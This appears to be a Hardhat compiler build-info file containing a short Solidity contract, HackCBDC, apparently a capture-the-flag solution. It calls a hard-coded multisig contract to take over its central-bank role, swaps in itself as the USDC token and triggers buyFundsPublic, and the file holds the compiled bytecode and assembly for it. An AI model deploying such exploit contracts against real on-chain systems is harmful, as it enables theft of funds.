{
	"id": "dc8e68cf09e80fd64c0b5bfc3dba1e06",
	"_format": "hh-sol-build-info-1",
	"solcVersion": "0.8.17",
	"solcLongVersion": "0.8.17+commit.8df45f5f",
	"input": {
		"language": "Solidity",
		"settings": {
			"optimizer": {
				"enabled": true,
				"runs": 200
			},
			"outputSelection": {
				"*": {
					"": [
						"ast"
					],
					"*": [
						"abi",
						"metadata",
						"devdoc",
						"userdoc",
						"storageLayout",
						"evm.legacyAssembly",
						"evm.bytecode",
						"evm.deployedBytecode",
						"evm.methodIdentifiers",
						"evm.gasEstimates",
						"evm.assembly"
					]
				}
			},
			"evmVersion": "byzantium"
		},
		"sources": {
			"contracts/PriceUpdater.sol": {
				"content": "// SPDX-License-Identifier: GPL-3.0\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\n\ninterface MultiSig is IERC20{\n  function upgradeUSDC(address _usdc) external ;\n  function signWithdrawal() external;\n  function updateCentralBank(address _newBank) external;\n  function addSignature(address _newSig) external;\n  function buyFundsPublic() external;\n}\n\ncontract HackCBDC  {\n  address private cbdc = 0x550714e1Fd747084Fc5cB2B2e3a93512972aeBdA;\n\n  function updateCentralBank() public {\n    MultiSig(cbdc).updateCentralBank(msg.sender);\n  }\n  // function addSignature() public {\n  //   MultiSig(cbdc).addSignature(msg.sender);\n\n  // }\n\n  //  function signWithdrawal() public {\n  //   MultiSig(cbdc).signWithdrawal();\n\n  // }\n\n   function upgradeUSDC() public {\n    MultiSig(cbdc).upgradeUSDC(address(this));\n    MultiSig(cbdc).buyFundsPublic();\n  }\n\n    function buyFundsPublic() public {\n      MultiSig(cbdc).buyFundsPublic();\n  }\n}\n"
			},
			"@openzeppelin/contracts/token/ERC20/IERC20.sol": {
				"content": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)\n\npragma solidity ^0.8.0;\n\n/**\n * @dev Interface of the ERC20 standard as defined in the EIP.\n */\ninterface IERC20 {\n    /**\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\n     * another (`to`).\n     *\n     * Note that `value` may be zero.\n     */\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to {approve}. `value` is the new allowance.\n     */\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n\n    /**\n     * @dev Returns the amount of tokens in existence.\n     */\n    function totalSupply() external view returns (uint256);\n\n    /**\n     * @dev Returns the amount of tokens owned by `account`.\n     */\n    function balanceOf(address account) external view returns (uint256);\n\n    /**\n     * @dev Moves `amount` tokens from the caller's account to `to`.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transfer(address to, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Returns the remaining number of tokens that `spender` will be\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\n     * zero by default.\n     *\n     * This value changes when {approve} or {transferFrom} are called.\n     */\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n     * that someone may use both the old and the new allowance by unfortunate\n     * transaction ordering. One possible solution to mitigate this race\n     * condition is to first reduce the spender's allowance to 0 and set the\n     * desired value afterwards:\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n     *\n     * Emits an {Approval} event.\n     */\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Moves `amount` tokens from `from` to `to` using the\n     * allowance mechanism. `amount` is then deducted from the caller's\n     * allowance.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) external returns (bool);\n}\n"
			}
		}
	},
	"output": {
		"contracts": {
			"@openzeppelin/contracts/token/ERC20/IERC20.sol": {
				"IERC20": {
					"abi": [
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "spender",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "Approval",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "from",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "Transfer",
							"type": "event"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "spender",
									"type": "address"
								}
							],
							"name": "allowance",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "spender",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "amount",
									"type": "uint256"
								}
							],
							"name": "approve",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "account",
									"type": "address"
								}
							],
							"name": "balanceOf",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "totalSupply",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "amount",
									"type": "uint256"
								}
							],
							"name": "transfer",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "from",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "amount",
									"type": "uint256"
								}
							],
							"name": "transferFrom",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"details": "Interface of the ERC20 standard as defined in the EIP.",
						"events": {
							"Approval(address,address,uint256)": {
								"details": "Emitted when the allowance of a `spender` for an `owner` is set by a call to {approve}. `value` is the new allowance."
							},
							"Transfer(address,address,uint256)": {
								"details": "Emitted when `value` tokens are moved from one account (`from`) to another (`to`). Note that `value` may be zero."
							}
						},
						"kind": "dev",
						"methods": {
							"allowance(address,address)": {
								"details": "Returns the remaining number of tokens that `spender` will be allowed to spend on behalf of `owner` through {transferFrom}. This is zero by default. This value changes when {approve} or {transferFrom} are called."
							},
							"approve(address,uint256)": {
								"details": "Sets `amount` as the allowance of `spender` over the caller's tokens. Returns a boolean value indicating whether the operation succeeded. IMPORTANT: Beware that changing an allowance with this method brings the risk that someone may use both the old and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this race condition is to first reduce the spender's allowance to 0 and set the desired value afterwards: https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729 Emits an {Approval} event."
							},
							"balanceOf(address)": {
								"details": "Returns the amount of tokens owned by `account`."
							},
							"totalSupply()": {
								"details": "Returns the amount of tokens in existence."
							},
							"transfer(address,uint256)": {
								"details": "Moves `amount` tokens from the caller's account to `to`. Returns a boolean value indicating whether the operation succeeded. Emits a {Transfer} event."
							},
							"transferFrom(address,address,uint256)": {
								"details": "Moves `amount` tokens from `from` to `to` using the allowance mechanism. `amount` is then deducted from the caller's allowance. Returns a boolean value indicating whether the operation succeeded. Emits a {Transfer} event."
							}
						},
						"version": 1
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"functionDebugData": {},
							"generatedSources": [],
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"functionDebugData": {},
							"generatedSources": [],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {
							"allowance(address,address)": "dd62ed3e",
							"approve(address,uint256)": "095ea7b3",
							"balanceOf(address)": "70a08231",
							"totalSupply()": "18160ddd",
							"transfer(address,uint256)": "a9059cbb",
							"transferFrom(address,address,uint256)": "23b872dd"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.17+commit.8df45f5f\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"details\":\"Interface of the ERC20 standard as defined in the EIP.\",\"events\":{\"Approval(address,address,uint256)\":{\"details\":\"Emitted when the allowance of a `spender` for an `owner` is set by a call to {approve}. `value` is the new allowance.\"},\"Transfer(address,address,uint256)\":{\"details\":\"Emitted when `value` tokens are moved from one account (`from`) to another (`to`). Note that `value` may be zero.\"}},\"kind\":\"dev\",\"methods\":{\"allowance(address,address)\":{\"details\":\"Returns the remaining number of tokens that `spender` will be allowed to spend on behalf of `owner` through {transferFrom}. This is zero by default. This value changes when {approve} or {transferFrom} are called.\"},\"approve(address,uint256)\":{\"details\":\"Sets `amount` as the allowance of `spender` over the caller's tokens. Returns a boolean value indicating whether the operation succeeded. IMPORTANT: Beware that changing an allowance with this method brings the risk that someone may use both the old and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this race condition is to first reduce the spender's allowance to 0 and set the desired value afterwards: https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729 Emits an {Approval} event.\"},\"balanceOf(address)\":{\"details\":\"Returns the amount of tokens owned by `account`.\"},\"totalSupply()\":{\"details\":\"Returns the amount of tokens in existence.\"},\"transfer(address,uint256)\":{\"details\":\"Moves `amount` tokens from the caller's account to `to`. Returns a boolean value indicating whether the operation succeeded. Emits a {Transfer} event.\"},\"transferFrom(address,address,uint256)\":{\"details\":\"Moves `amount` tokens from `from` to `to` using the allowance mechanism. `amount` is then deducted from the caller's allowance. Returns a boolean value indicating whether the operation succeeded. Emits a {Transfer} event.\"}},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"@openzeppelin/contracts/token/ERC20/IERC20.sol\":\"IERC20\"},\"evmVersion\":\"byzantium\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts/token/ERC20/IERC20.sol\":{\"keccak256\":\"0x9750c6b834f7b43000631af5cc30001c5f547b3ceb3635488f140f60e897ea6b\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://5a7d5b1ef5d8d5889ad2ed89d8619c09383b80b72ab226e0fe7bde1636481e34\",\"dweb:/ipfs/QmebXWgtEfumQGBdVeM6c71McLixYXQP5Bk6kKXuoY4Bmr\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			},
			"contracts/PriceUpdater.sol": {
				"HackCBDC": {
					"abi": [
						{
							"inputs": [],
							"name": "buyFundsPublic",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "updateCentralBank",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "upgradeUSDC",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"contracts/PriceUpdater.sol\":386:963  contract HackCBDC  {... */\n  mstore(0x40, 0x80)\n    /* \"contracts/PriceUpdater.sol\":409:474  address private cbdc = 0x550714e1Fd747084Fc5cB2B2e3a93512972aeBdA */\n  0x00\n  dup1\n  sload\n  not(sub(exp(0x02, 0xa0), 0x01))\n  and\n    /* \"contracts/PriceUpdater.sol\":432:474  0x550714e1Fd747084Fc5cB2B2e3a93512972aeBdA */\n  0x550714e1fd747084fc5cb2b2e3a93512972aebda\n    /* \"contracts/PriceUpdater.sol\":409:474  address private cbdc = 0x550714e1Fd747084Fc5cB2B2e3a93512972aeBdA */\n  or\n  swap1\n  sstore\n    /* \"contracts/PriceUpdater.sol\":386:963  contract HackCBDC  {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/PriceUpdater.sol\":386:963  contract HackCBDC  {... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      div(calldataload(0x00), 0x0100000000000000000000000000000000000000000000000000000000)\n      0x9b6822f8\n      dup2\n      eq\n      tag_3\n      jumpi\n      dup1\n      0xe9e8f34d\n      eq\n      tag_4\n      jumpi\n      dup1\n      0xf99a1f30\n      eq\n      tag_5\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"contracts/PriceUpdater.sol\":479:570  function updateCentralBank() public {... */\n    tag_3:\n      tag_6\n      tag_7\n      jump\t// in\n    tag_6:\n      stop\n        /* \"contracts/PriceUpdater.sol\":759:878  function upgradeUSDC() public {... */\n    tag_4:\n      tag_6\n      tag_9\n      jump\t// in\n        /* \"contracts/PriceUpdater.sol\":884:961  function buyFundsPublic() public {... */\n    tag_5:\n      tag_6\n      tag_11\n      jump\t// in\n        /* \"contracts/PriceUpdater.sol\":479:570  function updateCentralBank() public {... */\n    tag_7:\n        /* \"contracts/PriceUpdater.sol\":530:534  cbdc */\n      sload(0x00)\n        /* \"contracts/PriceUpdater.sol\":521:565  MultiSig(cbdc).updateCentralBank(msg.sender) */\n      mload(0x40)\n      0x077bf51a00000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n        /* \"contracts/PriceUpdater.sol\":554:564  msg.sender */\n      caller\n        /* \"contracts/PriceUpdater.sol\":521:565  MultiSig(cbdc).updateCentralBank(msg.sender) */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":160:234   */\n      mstore\n        /* \"contracts/PriceUpdater.sol\":530:534  cbdc */\n      0xffffffffffffffffffffffffffffffffffffffff\n      swap1\n      swap2\n      and\n      swap1\n        /* \"contracts/PriceUpdater.sol\":521:553  MultiSig(cbdc).updateCentralBank */\n      0x077bf51a\n      swap1\n        /* \"#utility.yul\":133:151   */\n      0x24\n      add\n        /* \"contracts/PriceUpdater.sol\":521:565  MultiSig(cbdc).updateCentralBank(msg.sender) */\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_15\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_15:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_17\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_17:\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/PriceUpdater.sol\":479:570  function updateCentralBank() public {... */\n      jump\t// out\n        /* \"contracts/PriceUpdater.sol\":759:878  function upgradeUSDC() public {... */\n    tag_9:\n        /* \"contracts/PriceUpdater.sol\":804:808  cbdc */\n      sload(0x00)\n        /* \"contracts/PriceUpdater.sol\":795:836  MultiSig(cbdc).upgradeUSDC(address(this)) */\n      mload(0x40)\n      0x8cba468600000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n        /* \"contracts/PriceUpdater.sol\":830:834  this */\n      address\n        /* \"contracts/PriceUpdater.sol\":795:836  MultiSig(cbdc).upgradeUSDC(address(this)) */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":160:234   */\n      mstore\n        /* \"contracts/PriceUpdater.sol\":804:808  cbdc */\n      0xffffffffffffffffffffffffffffffffffffffff\n      swap1\n      swap2\n      and\n      swap1\n        /* \"contracts/PriceUpdater.sol\":795:821  MultiSig(cbdc).upgradeUSDC */\n      0x8cba4686\n      swap1\n        /* \"#utility.yul\":133:151   */\n      0x24\n      add\n        /* \"contracts/PriceUpdater.sol\":795:836  MultiSig(cbdc).upgradeUSDC(address(this)) */\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_20\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_20:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_22\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_22:\n      pop\n      pop\n        /* \"contracts/PriceUpdater.sol\":851:855  cbdc */\n      0x00\n      dup1\n      sload\n        /* \"contracts/PriceUpdater.sol\":842:873  MultiSig(cbdc).buyFundsPublic() */\n      0x40\n      dup1\n      mload\n      0xf99a1f3000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      swap1\n      mload\n        /* \"contracts/PriceUpdater.sol\":851:855  cbdc */\n      0xffffffffffffffffffffffffffffffffffffffff\n      swap1\n      swap3\n      and\n      swap5\n      pop\n        /* \"contracts/PriceUpdater.sol\":842:871  MultiSig(cbdc).buyFundsPublic */\n      0xf99a1f30\n      swap4\n      pop\n        /* \"contracts/PriceUpdater.sol\":842:873  MultiSig(cbdc).buyFundsPublic() */\n      0x04\n      dup1\n      dup3\n      add\n      swap4\n        /* \"contracts/PriceUpdater.sol\":851:855  cbdc */\n      swap3\n        /* \"contracts/PriceUpdater.sol\":842:873  MultiSig(cbdc).buyFundsPublic() */\n      swap2\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"contracts/PriceUpdater.sol\":851:855  cbdc */\n      dup4\n      dup8\n        /* \"contracts/PriceUpdater.sol\":842:873  MultiSig(cbdc).buyFundsPublic() */\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_15\n      jumpi\n      0x00\n      dup1\n      revert\n        /* \"contracts/PriceUpdater.sol\":884:961  function buyFundsPublic() public {... */\n    tag_11:\n        /* \"contracts/PriceUpdater.sol\":934:938  cbdc */\n      0x00\n      dup1\n      sload\n        /* \"contracts/PriceUpdater.sol\":925:956  MultiSig(cbdc).buyFundsPublic() */\n      0x40\n      dup1\n      mload\n      0xf99a1f3000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      swap1\n      mload\n        /* \"contracts/PriceUpdater.sol\":934:938  cbdc */\n      0xffffffffffffffffffffffffffffffffffffffff\n      swap1\n      swap3\n      and\n      swap3\n        /* \"contracts/PriceUpdater.sol\":925:954  MultiSig(cbdc).buyFundsPublic */\n      0xf99a1f30\n      swap3\n        /* \"contracts/PriceUpdater.sol\":925:956  MultiSig(cbdc).buyFundsPublic() */\n      0x04\n      dup1\n      dup5\n      add\n      swap4\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"contracts/PriceUpdater.sol\":934:938  cbdc */\n      dup4\n      dup8\n        /* \"contracts/PriceUpdater.sol\":925:956  MultiSig(cbdc).buyFundsPublic() */\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_15\n      jumpi\n      0x00\n      dup1\n      revert\n\n    auxdata: 0xa26469706673582212200ad5e4dbd7bcf2fce90eb205f25e6f8fdafe4eab04cd4d36029b592455a7f24a64736f6c63430008110033\n}\n",
						"bytecode": {
							"functionDebugData": {},
							"generatedSources": [],
							"linkReferences": {},
							"object": "608060405260008054600160a060020a03191673550714e1fd747084fc5cb2b2e3a93512972aebda17905534801561003657600080fd5b5061028a806100466000396000f3fe608060405234801561001057600080fd5b506004361061005d577c010000000000000000000000000000000000000000000000000000000060003504639b6822f88114610062578063e9e8f34d1461006c578063f99a1f3014610074575b600080fd5b61006a61007c565b005b61006a610101565b61006a6101ed565b6000546040517f077bf51a00000000000000000000000000000000000000000000000000000000815233600482015273ffffffffffffffffffffffffffffffffffffffff9091169063077bf51a90602401600060405180830381600087803b1580156100e757600080fd5b505af11580156100fb573d6000803e3d6000fd5b50505050565b6000546040517f8cba468600000000000000000000000000000000000000000000000000000000815230600482015273ffffffffffffffffffffffffffffffffffffffff90911690638cba468690602401600060405180830381600087803b15801561016c57600080fd5b505af1158015610180573d6000803e3d6000fd5b505060008054604080517ff99a1f30000000000000000000000000000000000000000000000000000000008152905173ffffffffffffffffffffffffffffffffffffffff909216945063f99a1f309350600480820193929182900301818387803b1580156100e757600080fd5b60008054604080517ff99a1f30000000000000000000000000000000000000000000000000000000008152905173ffffffffffffffffffffffffffffffffffffffff9092169263f99a1f309260048084019382900301818387803b1580156100e757600080fdfea26469706673582212200ad5e4dbd7bcf2fce90eb205f25e6f8fdafe4eab04cd4d36029b592455a7f24a64736f6c63430008110033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 SLOAD PUSH1 0x1 PUSH1 0xA0 PUSH1 0x2 EXP SUB NOT AND PUSH20 0x550714E1FD747084FC5CB2B2E3A93512972AEBDA OR SWAP1 SSTORE CALLVALUE DUP1 ISZERO PUSH2 0x36 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x28A DUP1 PUSH2 0x46 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x5D JUMPI PUSH29 0x100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 CALLDATALOAD DIV PUSH4 0x9B6822F8 DUP2 EQ PUSH2 0x62 JUMPI DUP1 PUSH4 0xE9E8F34D EQ PUSH2 0x6C JUMPI DUP1 PUSH4 0xF99A1F30 EQ PUSH2 0x74 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x6A PUSH2 0x7C JUMP JUMPDEST STOP JUMPDEST PUSH2 0x6A PUSH2 0x101 JUMP JUMPDEST PUSH2 0x6A PUSH2 0x1ED JUMP JUMPDEST PUSH1 0x0 SLOAD PUSH1 0x40 MLOAD PUSH32 0x77BF51A00000000000000000000000000000000000000000000000000000000 DUP2 MSTORE CALLER PUSH1 0x4 DUP3 ADD MSTORE PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF SWAP1 SWAP2 AND SWAP1 PUSH4 0x77BF51A SWAP1 PUSH1 0x24 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xE7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0xFB JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 SLOAD PUSH1 0x40 MLOAD PUSH32 0x8CBA468600000000000000000000000000000000000000000000000000000000 DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF SWAP1 SWAP2 AND SWAP1 PUSH4 0x8CBA4686 SWAP1 PUSH1 0x24 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x16C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x180 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP PUSH1 0x0 DUP1 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH32 0xF99A1F3000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE SWAP1 MLOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF SWAP1 SWAP3 AND SWAP5 POP PUSH4 0xF99A1F30 SWAP4 POP PUSH1 0x4 DUP1 DUP3 ADD SWAP4 SWAP3 SWAP2 DUP3 SWAP1 SUB ADD DUP2 DUP4 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xE7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH32 0xF99A1F3000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE SWAP1 MLOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF SWAP1 SWAP3 AND SWAP3 PUSH4 0xF99A1F30 SWAP3 PUSH1 0x4 DUP1 DUP5 ADD SWAP4 DUP3 SWAP1 SUB ADD DUP2 DUP4 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xE7 JUMPI PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 EXP 0xD5 0xE4 0xDB 0xD7 0xBC CALLCODE 0xFC 0xE9 0xE 0xB2 SDIV CALLCODE 0x5E PUSH16 0x8FDAFE4EAB04CD4D36029B592455A7F2 0x4A PUSH5 0x736F6C6343 STOP ADDMOD GT STOP CALLER ",
							"sourceMap": "386:577:1:-:0;;;409:65;;;-1:-1:-1;;;;;;409:65:1;432:42;409:65;;;386:577;;;;;;;;;;;;;;;;"
						},
						"deployedBytecode": {
							"functionDebugData": {
								"@buyFundsPublic_149": {
									"entryPoint": 493,
									"id": 149,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"@updateCentralBank_119": {
									"entryPoint": 124,
									"id": 119,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"@upgradeUSDC_139": {
									"entryPoint": 257,
									"id": 139,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"abi_encode_tuple_t_address__to_t_address__fromStack_reversed": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								}
							},
							"generatedSources": [
								{
									"ast": {
										"nodeType": "YulBlock",
										"src": "0:242:2",
										"statements": [
											{
												"nodeType": "YulBlock",
												"src": "6:3:2",
												"statements": []
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "115:125:2",
													"statements": [
														{
